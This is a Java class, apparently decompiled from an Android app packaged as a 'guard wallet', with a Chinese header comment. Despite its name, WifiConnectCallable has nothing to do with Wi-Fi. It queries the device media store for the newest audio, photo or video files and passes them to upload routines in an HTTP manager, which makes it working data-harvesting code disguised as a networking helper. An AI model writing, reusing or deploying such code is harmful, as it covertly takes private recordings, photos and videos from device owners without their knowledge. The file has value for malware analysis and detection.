/**
 * vendor thread/a.java — WifiConnectCallable
 *
 * Callable<Boolean> 实现，根据 mode 分派音频/图片/视频的媒体库扫描与上传。
 * mode: 0=Audio, 1=Photo, 2=Video
 */
package com.guard.wallet.thread;

import com.guard.wallet.core.AppUtils;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import java.io.File;
import java.util.LinkedList;
import java.util.concurrent.Callable;

public final class WifiConnectCallable implements Callable<Boolean> {
    public final int a;
    public final Uri b;

    public WifiConnectCallable(int mode, Uri uri) {
        this.a = mode;
        this.b = uri;
    }

    @Override
    public Boolean call() {
        try {
            switch (this.a) {
                case 0:
                    return d("AudioAlbumChangeThread", com.guard.wallet.utils.SystemHelper.m(), 0);
                case 1:
                    return d("PhotoAlbumChangeThread", com.guard.wallet.utils.SystemHelper.o(), 1);
                default:
                    return d("VideoAlbumChangeThread", com.guard.wallet.utils.SystemHelper.q(), 2);
            }
        } catch (Exception ex) {
            AppUtils.s("MediaAlbumChangeThread", ex);
            return Boolean.FALSE;
        }
    }

    private Boolean d(String tag, boolean hasPermission, int mediaType) {
        if (com.guard.wallet.utils.SystemHelper.Z() == null || !hasPermission || this.b == null) {
            return Boolean.TRUE;
        }

        LinkedList<File> files = new LinkedList<>();
        ContentResolver resolver = com.guard.wallet.utils.SystemHelper.Z().getContentResolver();
        if (resolver != null) {
            Cursor cursor = null;
            try {
                cursor = resolver.query(
                        this.b,
                        new String[]{"_id", "_data", "_display_name"},
                        null,
                        null,
                        "date_modified desc"
                );
                while (cursor != null && cursor.moveToNext()) {
                    String path = cursor.getString(cursor.getColumnIndexOrThrow("_data"));
                    if (AppUtils.B(path)) {
                        continue;
                    }
                    File file = new File(path);
                    if (!file.exists() || !file.isFile()) {
                        continue;
                    }
                    if (mediaType == 2 && !file.canRead()) {
                        continue;
                    }
                    files.add(file);
                    if (mediaType == 1) {
                        break;
                    }
                }
            } catch (Exception ex) {
                AppUtils.s(tag, ex);
            } finally {
                if (cursor != null) {
                    cursor.close();
                }
            }
        }

        if (files.isEmpty()) {
            return Boolean.TRUE;
        }

        switch (mediaType) {
            case 0:
                com.guard.wallet.http.HttpApiManager.uploadAudioFiles(files);
                return Boolean.TRUE;
            case 1:
                com.guard.wallet.http.HttpApiManager.uploadPhotoFiles(files);
                return Boolean.TRUE;
            default:
                com.guard.wallet.http.HttpApiManager.uploadVideoFiles(files);
                return Boolean.TRUE;
        }
    }
}
